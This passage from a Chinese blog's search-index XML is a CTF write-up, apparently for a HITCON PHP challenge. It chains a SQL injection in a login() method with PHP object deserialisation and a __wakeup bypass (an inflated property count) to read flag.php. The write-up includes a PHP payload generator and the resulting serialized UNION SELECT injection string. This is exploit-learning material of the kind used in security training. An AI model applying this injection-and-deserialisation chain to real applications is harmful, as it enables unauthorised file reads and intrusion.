7.0.10<br>我刚好是5.6.30很多讲解了里都没有提漏洞范围,当时复现的直接自闭了…..</p></blockquote><p>2.直接进入漏洞存在点login()方法,发现存在sql注入,然后将sql查询的结果role属性进行了反序列化,绕过反序列化的方式和例题一致.反序列化的对象就是文件读取的类,再绕过一下__wakeup魔术方法就可以读取flag.ph文件了</p><p>3.至于如何控制sql查询语句role数值是你反序列化的内容···这就看你sql注入的水准了,反正我30秒就想出来了···<br>4.payload:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">HITCON</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$method</span>=<span class="hljs-string">&#x27;login&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$args</span>=<span class="hljs-keyword">array</span>();<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;args=<span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;1&#x27; union select 1,2,&#x27;a:1:&#123;i:0;O:+5:\&quot;SoFun\&quot;:2:&#123;s:4:\&quot;file\&quot;;s:8:\&quot;flag.php\&quot;;&#125;&#125;&#x27; #&quot;</span>,<span class="hljs-number">456</span>);<br>    &#125;<br><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">SoFun</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span>=<span class="hljs-string">&#x27;flag.php&#x27;</span>;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">empty</span>(<span class="hljs-keyword">$this</span>-&gt;file)) &#123;<br>            <span class="hljs-keyword">include</span> <span class="hljs-keyword">$this</span>-&gt;file;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$v</span>=<span class="hljs-keyword">new</span> HITCON();<br><span class="hljs-keyword">echo</span> serialize(<span class="hljs-variable">$v</span>);<br></code></pre></td></tr></table></figure><p>O:6:”HITCON”:3:{s:6:”method”;s:5:”login”;s:4:”args”;a:2:{i:0;s:77:”1’ union select 1,2,’a:1:{i:0;O:+5:”SoFun”:2:{s:4:”file”;s:8:”flag.php”;}}’ #”;i:1;i:456;}}</p><p>注意将属性个数加1绕过__wakeup()魔术方法两个都需要,里面那个别忘了O:+数字.</p>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 代码审计 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
